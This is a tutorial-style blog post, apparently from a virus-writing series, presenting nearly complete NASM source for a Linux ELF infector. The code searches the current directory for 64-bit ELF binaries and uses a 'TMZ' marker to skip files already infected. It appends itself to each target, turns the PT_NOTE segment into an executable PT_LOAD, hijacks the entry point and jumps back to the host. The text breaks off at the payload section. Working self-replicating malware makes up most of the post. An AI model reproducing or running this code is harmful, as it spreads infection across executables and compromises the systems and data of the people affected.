<p>If you need help understanding Linux <em>system calls</em> parameters, feel free to visit my new (work in progress) website: <a href="https://syscall.sh">https://syscall.sh</a></p>

<h3 id="the-secret-of-getting-ahead-is-getting-started">The secret of getting ahead is getting started</h3>

<p>For the stack buffer, I used <code>r15</code> register and added the comments below for reference when browsing the code.</p>

<p>Note the values, for example, the ELF header, which is <em>64 bytes</em> long. Since <code>r15 + 144</code> represents its start, it should end at <code>r15 + 207</code>. The values in between are also accounted for, like <code>ehdr.entry</code> that starts at <code>r15 + 168</code>, which is <em>8 bytes</em> long, ends at <code>r15 + 175</code>.</p>

<div class="highlight"><pre class="chroma"><code class="language-nasm" data-lang="nasm"><span class="c1">; r15 + 0 = stack buffer = stat</span>
<span class="c1">; r15 + 48 = stat.st_size</span>
<span class="c1">; r15 + 144 = ehdr</span>
<span class="c1">; r15 + 148 = ehdr.class</span>
<span class="c1">; r15 + 152 = ehdr.pad</span>
<span class="c1">; r15 + 168 = ehdr.entry</span>
<span class="c1">; r15 + 176 = ehdr.phoff</span>
<span class="c1">; r15 + 198 = ehdr.phentsize</span>
<span class="c1">; r15 + 200 = ehdr.phnum</span>
<span class="c1">; r15 + 208 = phdr = phdr.type</span>
<span class="c1">; r15 + 212 = phdr.flags</span>
<span class="c1">; r15 + 216 = phdr.offset</span>
<span class="c1">; r15 + 224 = phdr.vaddr</span>
<span class="c1">; r15 + 232 = phdr.paddr</span>
<span class="c1">; r15 + 240 = phdr.filesz</span>
<span class="c1">; r15 + 248 = phdr.memsz</span>
<span class="c1">; r15 + 256 = phdr.align</span>
<span class="c1">; r15 + 300 = jmp rel</span>
<span class="c1">; r15 + 350 = directory size</span>
<span class="c1">; r15 + 400 = dirent = dirent.d_ino</span>
<span class="c1">; r15 + 416 = dirent.d_reclen</span>
<span class="c1">; r15 + 418 = dirent.d_type</span>
<span class="c1">; r15 + 419 = dirent.d_name</span>
<span class="c1">; r15 + 3000 = first run control flag</span>
<span class="c1">; r15 + 3001 = decoded payload</span></code></pre></div>

<p>Reserving stack space is easy, there are different ways of doing it, one is to subtract from <code>rsp</code>, then just store it in <code>r15</code>. Also right on start, we store <code>argv0</code> to <code>r14</code> (it&rsquo;s going to be needed next) and we push <code>rdx</code> and <code>rsp</code>, which need to be restored before the end of virus execution, so the infected file can run properly.</p>

<div class="highlight"><pre class="chroma"><code class="language-nasm" data-lang="nasm"><span class="nl">v_start:</span>
    <span class="nf">mov</span> <span class="nv">r14</span><span class="p">,</span> <span class="p">[</span><span class="nb">rsp</span> <span class="o">+</span> <span class="mi">8</span><span class="p">]</span>  <span class="c1">; saving argv0 to r14</span>
    <span class="nf">push</span> <span class="nb">rdx</span>
    <span class="nf">push</span> <span class="nb">rsp</span>
    <span class="nf">sub</span> <span class="nb">rsp</span><span class="p">,</span> <span class="mi">5000</span>       <span class="c1">; reserving 5000 bytes</span>
    <span class="nf">mov</span> <span class="nv">r15</span><span class="p">,</span> <span class="nb">rsp</span>        <span class="c1">; r15 has the reserved stack buffer address</span></code></pre></div>

<p>To check for the virus first execution, we get <code>argv0</code> size in bytes and compare to the final virus size, which was stored in <code>V_SIZE</code>. If greater, it&rsquo;s not the first run and we set a control value into a place in the stack buffer for later use. This was a last minute addition that it&rsquo;s not great (but pretty easy to implement and rather obvious).</p>

<div class="highlight"><pre class="chroma"><code class="language-nasm" data-lang="nasm"><span class="nl">check_first_run:</span>
    <span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span>  <span class="nv">r14</span>                       <span class="c1">; argv0 to rdi</span>
    <span class="nf">mov</span> <span class="nb">rsi</span><span class="p">,</span> <span class="nv">O_RDONLY</span>
    <span class="nf">xor</span> <span class="nb">rdx</span><span class="p">,</span> <span class="nb">rdx</span>                        <span class="c1">; not using any flags</span>
    <span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="nv">SYS_OPEN</span>
    <span class="nf">syscall</span>                             <span class="c1">; rax contains the argv0 fd</span>

    <span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="nb">rax</span>
    <span class="nf">mov</span> <span class="nb">rsi</span><span class="p">,</span> <span class="nv">r15</span>                        <span class="c1">; rsi = r15 = stack buffer address</span>
    <span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="nv">SYS_FSTAT</span>                  <span class="c1">; getting argv0 size in bytes</span>
    <span class="nf">syscall</span>                             <span class="c1">; stat.st_size = [r15 + 48]</span>
    
    <span class="nf">cmp</span> <span class="kt">qword</span> <span class="p">[</span><span class="nv">r15</span> <span class="o">+</span> <span class="mi">48</span><span class="p">],</span> <span class="nv">V_SIZE</span>        <span class="c1">; compare argv0 size with virus size</span>
    <span class="nf">jg</span> <span class="nv">load_dir</span>                         <span class="c1">; if greater, not first run, continue infecting without setting control flag</span>
    
    <span class="nf">mov</span> <span class="kt">byte</span> <span class="p">[</span><span class="nv">r15</span> <span class="o">+</span> <span class="mi">3000</span><span class="p">],</span> <span class="nv">FIRST_RUN</span>    <span class="c1">; set the control flag to [r15 + 3000] to represent virus first execution</span></code></pre></div>

<h3 id="the-wild-hunt">The Wild Hunt</h3>

<p>We need to find targets to infect. For that we&rsquo;ll open the current directory for reading using <a href="https://linux.die.net/man/2/getdents64">getdents64</a> syscall, which will return the number of entries in it. That goes into the stack buffer.</p>

<div class="highlight"><pre class="chroma"><code class="language-nasm" data-lang="nasm"><span class="nl">load_dir:</span>
    <span class="nf">push</span> <span class="s">&#34;.&#34;</span>                       <span class="c1">; pushing &#34;.&#34; to stack (rsp)</span>
    <span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="nb">rsp</span>                   <span class="c1">; moving &#34;.&#34; to rdi</span>
    <span class="nf">mov</span> <span class="nb">rsi</span><span class="p">,</span> <span class="nv">O_RDONLY</span>
    <span class="nf">xor</span> <span class="nb">rdx</span><span class="p">,</span> <span class="nb">rdx</span>                   <span class="c1">; not using any flags</span>
    <span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="nv">SYS_OPEN</span>
    <span class="nf">syscall</span>                        <span class="c1">; rax contains the fd</span>

    <span class="nf">pop</span> <span class="nb">rdi</span>
    <span class="nf">cmp</span> <span class="nb">rax</span><span class="p">,</span> <span class="mi">0</span>                     <span class="c1">; if can&#39;t open file, exit now</span>
    <span class="nf">jbe</span> <span class="nv">v_stop</span>
    
    <span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="nb">rax</span>                   <span class="c1">; move fd to rdi</span>
    <span class="nf">lea</span> <span class="nb">rsi</span><span class="p">,</span> <span class="p">[</span><span class="nv">r15</span> <span class="o">+</span> <span class="mi">400</span><span class="p">]</span>           <span class="c1">; rsi = dirent = [r15 + 400]</span>
    <span class="nf">mov</span> <span class="nb">rdx</span><span class="p">,</span> <span class="nb">DI</span><span class="nv">RENT_BUFSIZE</span>        <span class="c1">; buffer with maximum directory size</span>
    <span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="nv">SYS_GETDENTS64</span>
    <span class="nf">syscall</span>                        <span class="c1">; dirent contains the directory entries</span>
    
    <span class="nf">test</span> <span class="nb">rax</span><span class="p">,</span> <span class="nb">rax</span>                  <span class="c1">; check directory list was successful</span>
    <span class="nf">js</span> <span class="nv">v_stop</span>                      <span class="c1">; if negative code is returned, I failed and should exit</span>
    
    <span class="nf">mov</span> <span class="kt">qword</span> <span class="p">[</span><span class="nv">r15</span> <span class="o">+</span> <span class="mi">350</span><span class="p">],</span> <span class="nb">rax</span>     <span class="c1">; [r15 + 350] now holds directory size</span>
    
    <span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="nv">SYS_CLOSE</span>             <span class="c1">; close source fd in rdi</span>
    <span class="nf">syscall</span>
    
    <span class="nf">xor</span> <span class="nb">rcx</span><span class="p">,</span> <span class="nb">rcx</span>                   <span class="c1">; will be the position in the directory entries</span></code></pre></div>

<p>Now the hunt gets a little more&hellip; <em>wild</em>, as we loop through each file from directory listing we just performed. Steps performed:</p>

<ul>
<li>Open target file</li>
<li>Validate that it&rsquo;s an <em>ELF</em> and <em>64 bits</em> (by verifying its magic number and class information from its header)</li>
<li>Check if already infected (by looking for the infection mark that should be set in <code>ehdr.pad</code>) and

<ul>
<li>if yes, move to next file, until all files in the directory are checked</li>
<li>If not, loop through the target <em>Program Headers</em>, looking for a <code>PT_NOTE</code> section, starting the infection process upon finding it</li>
</ul></li>
</ul>

<div class="highlight"><pre class="chroma"><code class="language-nasm" data-lang="nasm"><span class="nl">file_loop:</span>
    <span class="nf">push</span> <span class="nb">rcx</span>                                   <span class="c1">; preserving rcx</span>
    <span class="nf">cmp</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">rcx</span> <span class="o">+</span> <span class="nv">r15</span> <span class="o">+</span> <span class="mi">418</span><span class="p">],</span> <span class="nv">DT_REG</span>         <span class="c1">; check if it&#39;s a regular file dirent.d_type = [r15 + 418]</span>
    <span class="nf">jne</span> <span class="nv">.continue</span>                              <span class="c1">; if not, proceed to next file</span>

    <span class="nl">.open_target_file:</span>
        <span class="nf">lea</span> <span class="nb">rdi</span><span class="p">,</span> <span class="p">[</span><span class="nb">rcx</span> <span class="o">+</span> <span class="nv">r15</span> <span class="o">+</span> <span class="mi">419</span><span class="p">]</span>             <span class="c1">; dirent.d_name = [r15 + 419]</span>
        <span class="nf">mov</span> <span class="nb">rsi</span><span class="p">,</span> <span class="nv">O_RDWR</span>
        <span class="nf">xor</span> <span class="nb">rdx</span><span class="p">,</span> <span class="nb">rdx</span>                           <span class="c1">; not using any flags</span>
        <span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="nv">SYS_OPEN</span>
        <span class="nf">syscall</span>
    
        <span class="nf">cmp</span> <span class="nb">rax</span><span class="p">,</span> <span class="mi">0</span>                             <span class="c1">; if can&#39;t open file, exit now</span>
        <span class="nf">jbe</span> <span class="nv">.continue</span>
        <span class="nf">mov</span> <span class="nv">r9</span><span class="p">,</span> <span class="nb">rax</span>                            <span class="c1">; r9 contains target fd</span>
    
    <span class="nl">.read_ehdr:</span>
        <span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="nv">r9</span>                            <span class="c1">; r9 contains fd</span>
        <span class="nf">lea</span> <span class="nb">rsi</span><span class="p">,</span> <span class="p">[</span><span class="nv">r15</span> <span class="o">+</span> <span class="mi">144</span><span class="p">]</span>                   <span class="c1">; rsi = ehdr = [r15 + 144]</span>
        <span class="nf">mov</span> <span class="nb">rdx</span><span class="p">,</span> <span class="nv">EHDR_SIZE</span>                     <span class="c1">; ehdr.size</span>
        <span class="nf">mov</span> <span class="nv">r10</span><span class="p">,</span> <span class="mi">0</span>                             <span class="c1">; read at offset 0</span>
        <span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="nv">SYS_PREAD64</span>
        <span class="nf">syscall</span>
    
    <span class="nl">.is_elf:</span>
        <span class="nf">cmp</span> <span class="kt">dword</span> <span class="p">[</span><span class="nv">r15</span> <span class="o">+</span> <span class="mi">144</span><span class="p">],</span> <span class="mh">0x464c457f</span>      <span class="c1">; 0x464c457f means .ELF (little-endian)</span>
        <span class="nf">jnz</span> <span class="nv">.close_file</span>                        <span class="c1">; not an ELF binary, close and continue to next file if any</span>
    
    <span class="nl">.is_64:</span>
        <span class="nf">cmp</span> <span class="kt">byte</span> <span class="p">[</span><span class="nv">r15</span> <span class="o">+</span> <span class="mi">148</span><span class="p">],</span> <span class="nv">ELFCLASS64</span>       <span class="c1">; check if target ELF is 64bit</span>
        <span class="nf">jne</span> <span class="nv">.close_file</span>                        <span class="c1">; skipt it if not</span>
    
    <span class="nl">.is_infected:</span>
        <span class="nf">cmp</span> <span class="kt">dword</span> <span class="p">[</span><span class="nv">r15</span> <span class="o">+</span> <span class="mi">152</span><span class="p">],</span> <span class="mh">0x005a4d54</span>      <span class="c1">; check signature in [r15 + 152] ehdr.pad (TMZ in little-endian, plus trailing zero to fill up a word size)</span>
        <span class="nf">jz</span> <span class="nv">.close_file</span>                         <span class="c1">; already infected, close and continue to next file if any</span>
    
        <span class="nf">mov</span> <span class="nv">r8</span><span class="p">,</span> <span class="p">[</span><span class="nv">r15</span> <span class="o">+</span> <span class="mi">176</span><span class="p">]</span>                    <span class="c1">; r8 now holds ehdr.phoff from [r15 + 176]</span>
        <span class="nf">xor</span> <span class="nb">rbx</span><span class="p">,</span> <span class="nb">rbx</span>                           <span class="c1">; initializing phdr loop counter in rbx</span>
        <span class="nf">xor</span> <span class="nv">r14</span><span class="p">,</span> <span class="nv">r14</span>                           <span class="c1">; r14 will hold phdr file offset</span>
    
    <span class="nl">.loop_phdr:</span>
        <span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="nv">r9</span>                            <span class="c1">; r9 contains fd</span>
        <span class="nf">lea</span> <span class="nb">rsi</span><span class="p">,</span> <span class="p">[</span><span class="nv">r15</span> <span class="o">+</span> <span class="mi">208</span><span class="p">]</span>                   <span class="c1">; rsi = phdr = [r15 + 208]</span>
        <span class="nf">mov</span> <span class="nb">dx</span><span class="p">,</span> <span class="kt">word</span> <span class="p">[</span><span class="nv">r15</span> <span class="o">+</span> <span class="mi">198</span><span class="p">]</span>               <span class="c1">; ehdr.phentsize is at [r15 + 198]</span>
        <span class="nf">mov</span> <span class="nv">r10</span><span class="p">,</span> <span class="nv">r8</span>                            <span class="c1">; read at ehdr.phoff from r8 (incrementing ehdr.phentsize each loop iteraction)</span>
        <span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="nv">SYS_PREAD64</span>
        <span class="nf">syscall</span>
    
        <span class="nf">cmp</span> <span class="kt">byte</span> <span class="p">[</span><span class="nv">r15</span> <span class="o">+</span> <span class="mi">208</span><span class="p">],</span> <span class="nv">PT_NOTE</span>          <span class="c1">; check if phdr.type in [r15 + 208] is PT_NOTE (4)</span>
        <span class="nf">jz</span> <span class="nv">.infect</span>                             <span class="c1">; if yes, start infecting</span>
    
        <span class="nf">inc</span> <span class="nb">rbx</span>                                <span class="c1">; if not, increase rbx counter</span>
        <span class="nf">cmp</span> <span class="nb">bx</span><span class="p">,</span> <span class="kt">word</span> <span class="p">[</span><span class="nv">r15</span> <span class="o">+</span> <span class="mi">200</span><span class="p">]</span>               <span class="c1">; check if we looped through all phdrs already (ehdr.phnum = [r15 + 200])</span>
        <span class="nf">jge</span> <span class="nv">.close_file</span>                        <span class="c1">; exit if no valid phdr for infection was found</span>
    
        <span class="nf">add</span> <span class="nb">r8w</span><span class="p">,</span> <span class="kt">word</span> <span class="p">[</span><span class="nv">r15</span> <span class="o">+</span> <span class="mi">198</span><span class="p">]</span>              <span class="c1">; otherwise, add current ehdr.phentsize from [r15 + 198] into r8w</span>
        <span class="nf">jnz</span> <span class="nv">.loop_phdr</span>                         <span class="c1">; read next phdr</span></code></pre></div>

<h3 id="reproductive-system-101">Reproductive System 101</h3>

<p>Did I already mention it was going to get wild? Just kidding, it&rsquo;s not really that complicated, just long. It goes like this:</p>

<ul>
<li>Append the virus code (<code>v_stop - v_start</code>) to the target end of file. These offsets will change during different virus executions, so I&rsquo;m using an old technique that calculates the delta memory offset using the <code>call</code> instruction and the value of <code>rbp</code> during runtime</li>
</ul>

<div class="highlight"><pre class="chroma"><code class="language-nasm" data-lang="nasm"><span class="nl">.infect:</span>
    <span class="nl">.get_target_phdr_file_offset:</span>
        <span class="nf">mov</span> <span class="nb">ax</span><span class="p">,</span> <span class="nb">bx</span>                                      <span class="c1">; loading phdr loop counter bx to ax</span>
        <span class="nf">mov</span> <span class="nb">dx</span><span class="p">,</span> <span class="kt">word</span> <span class="p">[</span><span class="nv">r15</span> <span class="o">+</span> <span class="mi">198</span><span class="p">]</span>                        <span class="c1">; loading ehdr.phentsize from [r15 + 198] to dx</span>
        <span class="nf">imul</span> <span class="nb">dx</span>                                         <span class="c1">; bx * ehdr.phentsize</span>
        <span class="nf">mov</span> <span class="nb">r14w</span><span class="p">,</span> <span class="nb">ax</span>
        <span class="nf">add</span> <span class="nv">r14</span><span class="p">,</span> <span class="p">[</span><span class="nv">r15</span> <span class="o">+</span> <span class="mi">176</span><span class="p">]</span>                            <span class="c1">; r14 = ehdr.phoff + (bx * ehdr.phentsize)</span>

    <span class="nl">.file_info:</span>
        <span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="nv">r9</span>
        <span class="nf">mov</span> <span class="nb">rsi</span><span class="p">,</span> <span class="nv">r15</span>                                    <span class="c1">; rsi = r15 = stack buffer address</span>
        <span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="nv">SYS_FSTAT</span>
        <span class="nf">syscall</span>                                         <span class="c1">; stat.st_size = [r15 + 48]</span>
    
    <span class="nl">.append_virus:</span>
        <span class="c1">; getting target EOF</span>
        <span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="nv">r9</span>                                     <span class="c1">; r9 contains fd</span>
        <span class="nf">mov</span> <span class="nb">rsi</span><span class="p">,</span> <span class="mi">0</span>                                      <span class="c1">; seek offset 0</span>
        <span class="nf">mov</span> <span class="nb">rdx</span><span class="p">,</span> <span class="nv">SEEK_END</span>
        <span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="nv">SYS_LSEEK</span>
        <span class="nf">syscall</span>                                         <span class="c1">; getting target EOF offset in rax</span>
        <span class="nf">push</span> <span class="nb">rax</span>                                        <span class="c1">; saving target EOF</span>
    
        <span class="nf">call</span> <span class="nv">.delta</span>                                     <span class="c1">; the age old trick</span>
        <span class="nl">.delta:</span>
            <span class="nf">pop</span> <span class="nb">rbp</span>
            <span class="nf">sub</span> <span class="nb">rbp</span><span class="p">,</span> <span class="nv">.delta</span>
    
        <span class="c1">; writing virus body to EOF</span>
        <span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="nv">r9</span>                                     <span class="c1">; r9 contains fd</span>
        <span class="nf">lea</span> <span class="nb">rsi</span><span class="p">,</span> <span class="p">[</span><span class="nb">rbp</span> <span class="o">+</span> <span class="nv">v_start</span><span class="p">]</span>                        <span class="c1">; loading v_start address in rsi</span>
        <span class="nf">mov</span> <span class="nb">rdx</span><span class="p">,</span> <span class="nv">v_stop</span> <span class="o">-</span> <span class="nv">v_start</span>                       <span class="c1">; virus size</span>
        <span class="nf">mov</span> <span class="nv">r10</span><span class="p">,</span> <span class="nb">rax</span>                                    <span class="c1">; rax contains target EOF offset from previous syscall</span>
        <span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="nv">SYS_PWRITE64</span>
        <span class="nf">syscall</span>
    
        <span class="nf">cmp</span> <span class="nb">rax</span><span class="p">,</span> <span class="mi">0</span>
        <span class="nf">jbe</span> <span class="nv">.close_file</span></code></pre></div>

<ul>
<li>Patching the target <code>PT_NOTE</code> segment

<ul>
<li>Adjust its type, making it a <code>PT_LOAD</code></li>
<li>Change its flags (making it executable)</li>
<li>Update its <code>phdr.vaddr</code> to point to the virus start (<code>0xc000000 + stat.st_size</code>)</li>
<li>Account for virus size on <code>phdr.filesz</code> and <code>phdr.memsz</code></li>
<li>Keep proper alignment</li>
</ul></li>
</ul>

<div class="highlight"><pre class="chroma"><code class="language-nasm" data-lang="nasm"><span class="nl">.patch_phdr:</span>
    <span class="nf">mov</span> <span class="kt">dword</span> <span class="p">[</span><span class="nv">r15</span> <span class="o">+</span> <span class="mi">208</span><span class="p">],</span> <span class="nv">PT_LOAD</span>                  <span class="c1">; change phdr type in [r15 + 208] from PT_NOTE to PT_LOAD (1)</span>
    <span class="nf">mov</span> <span class="kt">dword</span> <span class="p">[</span><span class="nv">r15</span> <span class="o">+</span> <span class="mi">212</span><span class="p">],</span> <span class="nv">PF_R</span> <span class="nv">or</span> <span class="nv">PF_X</span>             <span class="c1">; change phdr.flags in [r15 + 212] to PF_X (1) | PF_R (4)</span>
    <span class="nf">pop</span> <span class="nb">rax</span>                                         <span class="c1">; restoring target EOF offeset into rax</span>
    <span class="nf">mov</span> <span class="p">[</span><span class="nv">r15</span> <span class="o">+</span> <span class="mi">216</span><span class="p">],</span> <span class="nb">rax</span>                            <span class="c1">; phdr.offset [r15 + 216] = target EOF offset</span>
    <span class="nf">mov</span> <span class="nv">r13</span><span class="p">,</span> <span class="p">[</span><span class="nv">r15</span> <span class="o">+</span> <span class="mi">48</span><span class="p">]</span>                             <span class="c1">; storing target stat.st_size from [r15 + 48] in r13</span>
    <span class="nf">add</span> <span class="nv">r13</span><span class="p">,</span> <span class="mh">0xc000000</span>                              <span class="c1">; adding 0xc000000 to target file size</span>
    <span class="nf">mov</span> <span class="p">[</span><span class="nv">r15</span> <span class="o">+</span> <span class="mi">224</span><span class="p">],</span> <span class="nv">r13</span>                            <span class="c1">; changing phdr.vaddr in [r15 + 224] to new one in r13 (stat.st_size + 0xc000000)</span>
    <span class="nf">mov</span> <span class="kt">qword</span> <span class="p">[</span><span class="nv">r15</span> <span class="o">+</span> <span class="mi">256</span><span class="p">],</span> <span class="mh">0x200000</span>                 <span class="c1">; set phdr.align in [r15 + 256] to 2mb</span>
    <span class="nf">add</span> <span class="kt">qword</span> <span class="p">[</span><span class="nv">r15</span> <span class="o">+</span> <span class="mi">240</span><span class="p">],</span> <span class="nv">v_stop</span> <span class="o">-</span> <span class="nv">v_start</span> <span class="o">+</span> <span class="mi">5</span>     <span class="c1">; add virus size to phdr.filesz in [r15 + 240] + 5 for the jmp to original ehdr.entry</span>
    <span class="nf">add</span> <span class="kt">qword</span> <span class="p">[</span><span class="nv">r15</span> <span class="o">+</span> <span class="mi">248</span><span class="p">],</span> <span class="nv">v_stop</span> <span class="o">-</span> <span class="nv">v_start</span> <span class="o">+</span> <span class="mi">5</span>     <span class="c1">; add virus size to phdr.memsz in [r15 + 248] + 5 for the jmp to original ehdr.entry</span>

    <span class="c1">; writing patched phdr</span>
    <span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="nv">r9</span>                                     <span class="c1">; r9 contains fd</span>
    <span class="nf">mov</span> <span class="nb">rsi</span><span class="p">,</span> <span class="nv">r15</span>                                    <span class="c1">; rsi = r15 = stack buffer address</span>
    <span class="nf">lea</span> <span class="nb">rsi</span><span class="p">,</span> <span class="p">[</span><span class="nv">r15</span> <span class="o">+</span> <span class="mi">208</span><span class="p">]</span>                            <span class="c1">; rsi = phdr = [r15 + 208]</span>
    <span class="nf">mov</span> <span class="nb">dx</span><span class="p">,</span> <span class="kt">word</span> <span class="p">[</span><span class="nv">r15</span> <span class="o">+</span> <span class="mi">198</span><span class="p">]</span>                        <span class="c1">; ehdr.phentsize from [r15 + 198]</span>
    <span class="nf">mov</span> <span class="nv">r10</span><span class="p">,</span> <span class="nv">r14</span>                                    <span class="c1">; phdr from [r15 + 208]</span>
    <span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="nv">SYS_PWRITE64</span>
    <span class="nf">syscall</span>
    
    <span class="nf">cmp</span> <span class="nb">rax</span><span class="p">,</span> <span class="mi">0</span>
    <span class="nf">jbe</span> <span class="nv">.close_file</span></code></pre></div>

<ul>
<li>Patching the ELF header

<ul>
<li>Save original entrypoint for later in <code>r14</code></li>
<li>Update entrypoint to be the same as the patched segment virtual address (<code>phdr.vaddr</code>)</li>
<li>Add infection marker string to <code>ehdr.pad</code></li>
</ul></li>
</ul>

<div class="highlight"><pre class="chroma"><code class="language-nasm" data-lang="nasm"><span class="nl">.patch_ehdr:</span>
    <span class="c1">; patching ehdr</span>
    <span class="nf">mov</span> <span class="nv">r14</span><span class="p">,</span> <span class="p">[</span><span class="nv">r15</span> <span class="o">+</span> <span class="mi">168</span><span class="p">]</span>                            <span class="c1">; storing target original ehdr.entry from [r15 + 168] in r14</span>
    <span class="nf">mov</span> <span class="p">[</span><span class="nv">r15</span> <span class="o">+</span> <span class="mi">168</span><span class="p">],</span> <span class="nv">r13</span>                            <span class="c1">; set ehdr.entry in [r15 + 168] to r13 (phdr.vaddr)</span>
    <span class="nf">mov</span> <span class="nv">r13</span><span class="p">,</span> <span class="mh">0x005a4d54</span>                             <span class="c1">; loading virus signature into r13 (TMZ in little-endian)</span>
    <span class="nf">mov</span> <span class="p">[</span><span class="nv">r15</span> <span class="o">+</span> <span class="mi">152</span><span class="p">],</span> <span class="nv">r13</span>                            <span class="c1">; adding the virus signature to ehdr.pad in [r15 + 152]</span>

    <span class="c1">; writing patched ehdr</span>
    <span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="nv">r9</span>                                     <span class="c1">; r9 contains fd</span>
    <span class="nf">lea</span> <span class="nb">rsi</span><span class="p">,</span> <span class="p">[</span><span class="nv">r15</span> <span class="o">+</span> <span class="mi">144</span><span class="p">]</span>                            <span class="c1">; rsi = ehdr = [r15 + 144]</span>
    <span class="nf">mov</span> <span class="nb">rdx</span><span class="p">,</span> <span class="nv">EHDR_SIZE</span>                              <span class="c1">; ehdr.size</span>
    <span class="nf">mov</span> <span class="nv">r10</span><span class="p">,</span> <span class="mi">0</span>                                      <span class="c1">; ehdr.offset</span>
    <span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="nv">SYS_PWRITE64</span>
    <span class="nf">syscall</span>
    
    <span class="nf">cmp</span> <span class="nb">rax</span><span class="p">,</span> <span class="mi">0</span>
    <span class="nf">jbe</span> <span class="nv">.close_file</span></code></pre></div>

<h3 id="those-who-don-t-jump-will-never-fly">Those who don&rsquo;t jump will never fly</h3>

<p>Deep, right? That&rsquo;s exacly what we got to do, jump back to the original target entrypoint to continue the host execution.</p>

<p>We&rsquo;ll use a relative jump, which is represented by the <code>e9</code> opcode with a with a <em>32 bit</em> offset, making the whole instruction <em>5 bytes</em> long (<code>e9 00 00 00 00</code>).</p>

<p>To create this instruction, we use the following formula, considering the patched <code>phdr.vaddr</code> from before:</p>





<div class="alert ">
  

newEntryPoint = originalEntryPoint - (phdr.vaddr + 5) - virus_size


</div>



<p>There&rsquo;s no secret here, we need to write this instruction to the very end of the file, after the recenty added virus body.</p>

<div class="highlight"><pre class="chroma"><code class="language-nasm" data-lang="nasm"><span class="nl">.write_patched_jmp:</span>
    <span class="c1">; getting target new EOF</span>
    <span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="nv">r9</span>                                     <span class="c1">; r9 contains fd</span>
    <span class="nf">mov</span> <span class="nb">rsi</span><span class="p">,</span> <span class="mi">0</span>                                      <span class="c1">; seek offset 0</span>
    <span class="nf">mov</span> <span class="nb">rdx</span><span class="p">,</span> <span class="nv">SEEK_END</span>
    <span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="nv">SYS_LSEEK</span>
    <span class="nf">syscall</span>                                         <span class="c1">; getting target EOF offset in rax</span>

    <span class="c1">; creating patched jmp</span>
    <span class="nf">mov</span> <span class="nb">rdx</span><span class="p">,</span> <span class="p">[</span><span class="nv">r15</span> <span class="o">+</span> <span class="mi">224</span><span class="p">]</span>                            <span class="c1">; rdx = phdr.vaddr</span>
    <span class="nf">add</span> <span class="nb">rdx</span><span class="p">,</span> <span class="mi">5</span>
    <span class="nf">sub</span> <span class="nv">r14</span><span class="p">,</span> <span class="nb">rdx</span>
    <span class="nf">sub</span> <span class="nv">r14</span><span class="p">,</span> <span class="nv">v_stop</span> <span class="o">-</span> <span class="nv">v_start</span>
    <span class="nf">mov</span> <span class="kt">byte</span> <span class="p">[</span><span class="nv">r15</span> <span class="o">+</span> <span class="mi">300</span> <span class="p">],</span> <span class="mh">0xe9</span>
    <span class="nf">mov</span> <span class="kt">dword</span> <span class="p">[</span><span class="nv">r15</span> <span class="o">+</span> <span class="mi">301</span><span class="p">],</span> <span class="nb">r14d</span>
    
    <span class="c1">; writing patched jmp to EOF</span>
    <span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="nv">r9</span>                                     <span class="c1">; r9 contains fd</span>
    <span class="nf">lea</span> <span class="nb">rsi</span><span class="p">,</span> <span class="p">[</span><span class="nv">r15</span> <span class="o">+</span> <span class="mi">300</span><span class="p">]</span>                            <span class="c1">; rsi = patched jmp in stack buffer = [r15 + 208]</span>
    <span class="nf">mov</span> <span class="nb">rdx</span><span class="p">,</span> <span class="mi">5</span>                                      <span class="c1">; size of jmp rel</span>
    <span class="nf">mov</span> <span class="nv">r10</span><span class="p">,</span> <span class="nb">rax</span>                                    <span class="c1">; mov rax to r10 = new target EOF</span>
    <span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="nv">SYS_PWRITE64</span>
    <span class="nf">syscall</span>
    
    <span class="nf">cmp</span> <span class="nb">rax</span><span class="p">,</span> <span class="mi">0</span>
    <span class="nf">jbe</span> <span class="nv">.close_file</span>
    
    <span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="nv">SYS_SYNC</span>                               <span class="c1">; commiting filesystem caches to disk</span>
    <span class="nf">syscall</span></code></pre></div>

<h3 id="payload-s-on-the-way">Payload&rsquo;s on the way</h3>

<p>We&rsquo;re almost done here, phew! The final bits of code will take care of displaying the text payload to the screen.</p>

<ul>
<li>We check if it&rsquo;s the virus first run (which means it&rsquo;s not running from inside an infected file) and in case this is true, we print a message to the screen and exit</li>
<li>If not the first run, we print a different message to the screen, which is encoded using <code>xor</code> and <code>add</code> instructions. The purpose of this was to prevent the string from showing up in the binary as plain text</li>
</ul>

<div class="highlight"><pre class="chroma"><code class="language-nasm" data-lang="nasm"><span class="nf">cmp</span> <span class="kt">byte</span> <span class="p">[</span><span class="nv">r15</span> <span class="o">+</span> <span class="mi">3000</span><span class="p">],</span> <span class="nv">FIRST_RUN</span>                          <span class="c1">; checking if custom control flag we set earlier indicates virus first execution</span>
